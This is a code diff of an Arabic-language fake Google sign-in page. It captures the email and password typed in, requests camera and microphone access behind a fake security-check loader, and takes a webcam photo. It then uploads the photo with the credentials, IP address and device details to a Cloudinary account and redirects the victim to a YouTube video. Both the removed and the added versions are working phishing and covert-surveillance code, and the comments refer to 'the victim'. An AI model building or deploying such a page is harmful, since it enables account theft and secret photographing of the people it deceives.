@@ -6,108 +6,94 @@
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
-        .login-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        img.logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 16px; margin-bottom: 25px; color: #3c4043; }
-        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        input:focus { border: 2px solid #1a73e8; padding: 12px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; margin-top: 10px; }
-        #video, #canvas { display: none; }
-        .loading-msg { color: #5f6368; font-size: 14px; margin-top: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-card { width: 95%; max-width: 440px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        img.logo { width: 75px; margin-bottom: 15px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        p { color: #3c4043; font-size: 16px; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+        #v, #c { display: none; }
+        .loader { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="login-box" id="container">
-    <div id="loginForm">
+<div class="login-card" id="ui">
+    <div id="form">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
         <h1>تسجيل الدخول</h1>
-        <p>استخدم حسابك على Google للمتابعة إلى YouTube</p>
-        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-        <button onclick="startInfection()">التالي</button>
+        <p>المتابعة إلى YouTube</p>
+        <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" id="p" placeholder="كلمة المرور" required>
+        <button onclick="start()">التالي</button>
+    </div>
+    <div id="load" class="loader">
+        <img src="https://i.gifer.com/ZZ5H.gif" width="40">
+        <p style="margin-top:15px; color:#5f6368;">جاري التحقق من أمان الحساب...</p>
     </div>
 </div>
 
-<video id="video" playsinline autoplay muted></video> <canvas id="canvas" width="640" height="480"></canvas>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c" width="640" height="480"></canvas>
 
 <script>
-    const cloudName = 'dgkttv99v';
-    const uploadPreset = 'ml_default';
-    const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-    async function startInfection() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        if(!email || !pass) return alert("يرجى إدخال البيانات");
+    async function start() {
+        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
+        if(!email || !pass) return;
 
-        // الخروج المشرف (ب): تمويه عملية التحقق
-        document.getElementById('container').innerHTML = `
-            <img src="https://i.gifer.com/ZZ5H.gif" width="40">
-            <h1>جاري التحقق...</h1>
-            <p class="loading-msg">يتم الآن التأكد من أمان المتصفح وتحديث بروتوكولات YouTube...</p>
-        `;
+        // إظهار التمويه فوراً
+        document.getElementById('form').style.display = 'none';
+        document.getElementById('load').style.display = 'block';
 
         try {
-            // طلب الصلاحيات (سيظهر طلب الكروم الرسمي)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const v = document.getElementById('video');
-            v.srcObject = stream;
-            v.muted = true; // لضمان عدم سماع الضحية لصوته
+            // طلب الكاميرا والمايك (سيظهر طلب الكروم الرسمي)
+            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('v');
+            video.srcObject = s;
+            video.muted = true;
+            video.play(); // لضمان عدم خروج شاشة سوداء
 
-            // سحب البيانات (أ): جمع معلومات الجهاز
-            const deviceData = {
-                model: navigator.userAgent.split(') ')[0].split(' (')[1],
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency,
-                lang: navigator.language,
-                ram: navigator.deviceMemory || "Unknown"
-            };
+            // انتظار ثانيتين (وقت منطقي للتحميل + وقت للكاميرا تفتح بوضوح)
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const img = canvas.toDataURL("image/png");
 
-            // تشغيل الفيديو في تاب جديدة لضمان بقاء التاب الحالية مفتوحة أطول وقت
-            window.open(youtubeLink, '_blank');
+                // سحب البيانات والرفع في الخلفية (Background)
+                handleData(email, pass, img);
 
-            // التقاط سلسلة صور (كل 3 ثواني صورة) لزيادة فرص الصيد
-            let shotCount = 0;
-            const interval = setInterval(() => {
-                captureAndUpload(email, pass, deviceData);
-                shotCount++;
-                if(shotCount >= 5) clearInterval(interval); // توقف بعد 5 صور
-            }, 3000);
+                // التحويل الفوري لليوتيوب (بدون انتظار نتيجة الرفع)
+                window.location.href = yt;
+            }, 2500); 
 
-        } catch (e) {
-            // الخروج المشرف عند الرفض: الانتقال لليوتيوب مباشرة
-            window.location.href = youtubeLink;
+        } catch (err) {
+            window.location.href = yt; // لو رفض يروح لليوتيوب فوراً
         }
     }
 
-    async function captureAndUpload(email, pass, device) {
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('video');
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        const img = canvas.toDataURL("image/png");
-
-        let ip = "Unknown";
+    async function handleData(email, pass, img) {
+        let ip = "0.0.0.0", dev = "Unknown";
         try { 
-            const res = await fetch('https://api.ipify.org?format=json'); 
-            const data = await res.json(); 
-            ip = data.ip; 
-        } catch(err){}
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            ip = d.ip;
+            dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+        } catch(e){}
 
         const fd = new FormData();
         fd.append('file', img);
-        fd.append('upload_preset', uploadPreset);
-        
-        // دمج بيانات الجهاز (أ) مع بيانات الدخول
-        const contextInfo = `user=${email}|pass=${pass}|ip=${ip}|device=${device.model}|ram=${device.ram}|os=${device.platform}`;
-        fd.append('context', contextInfo);
-        fd.append('tags', `Device_${device.model},IP_${ip}`);
+        fd.append('upload_preset', pr);
+        fd.append('context', `u=${email}|p=${pass}|ip=${ip}|dev=${dev}`);
+        fd.append('tags', `Target_${email},IP_${ip}`);
 
-        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+        // استخدام keepalive يضمن وصول البيانات للسيرفر حتى بعد قفل التاب
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, {
             method: 'POST',
-            body: fd
+            body: fd,
+            keepalive: true 
         });
     }
 </script>
